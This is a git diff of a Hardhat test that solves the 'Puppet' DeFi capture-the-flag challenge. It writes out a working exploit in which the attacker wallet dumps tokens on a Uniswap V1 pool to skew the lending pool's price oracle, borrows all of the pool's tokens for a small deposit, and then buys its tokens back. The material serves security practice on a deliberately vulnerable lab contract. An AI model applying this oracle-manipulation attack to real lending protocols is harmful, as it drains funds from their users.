@@ -1,6 +1,6 @@
 const exchangeJson = require("../../build-uniswap-v1/UniswapV1Exchange.json");
 const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json");
-
+const { ether, BN, balance } = require("@openzeppelin/test-helpers");
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 
@@ -102,7 +102,55 @@ describe('[Challenge] Puppet', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        // Connect to the contracts with the attackers wallet
+        const puppetAttack = this.lendingPool.connect(attacker);
+        const tokenAttack = this.token.connect(attacker);
+        const uniswapAttack = this.uniswapExchange.connect(attacker);
+
+        // Approve token to swap with UniSwap
+        await tokenAttack.approve(uniswapAttack.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+        
+
+        // Calculate ETH Pay out
+        const ethPayout = await uniswapAttack.getTokenToEthInputPrice(ATTACKER_INITIAL_TOKEN_BALANCE,
+            {
+                gasLimit: 1e6
+            });
+ 
+        
+        await uniswapAttack.tokenToEthSwapInput(
+            ATTACKER_INITIAL_TOKEN_BALANCE, 
+            ethers.utils.parseEther("9"),
+            (await ethers.provider.getBlock('latest')).timestamp * 2, 
+        )
+
+        // Deposit ETH required to gain ALL tokens from the pool
+        const deposit = await puppetAttack.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
+        
+        await puppetAttack.borrow(POOL_INITIAL_TOKEN_BALANCE, {
+            value: deposit
+        })
+       
+
+        const tokensToBuyBack = ATTACKER_INITIAL_TOKEN_BALANCE;
+        const ethReq = await uniswapAttack.getEthToTokenOutputPrice(tokensToBuyBack,
+        {
+            gasLimit: 1e6
+        })
+        console.log(`Eth Required for ${tokensToBuyBack} tokens:`, ethers.utils.formatEther(ethReq))
+
+        // Get our original 1000 tokens back by swapping eth
+        await uniswapAttack.ethToTokenSwapOutput(
+            tokensToBuyBack,
+            (await ethers.provider.getBlock('latest')).timestamp * 2, 
+            {
+                value: ethReq,
+                gasLimit: 1e6
+            }
+        )
+            
+      
+
     });
 
     after(async function () {
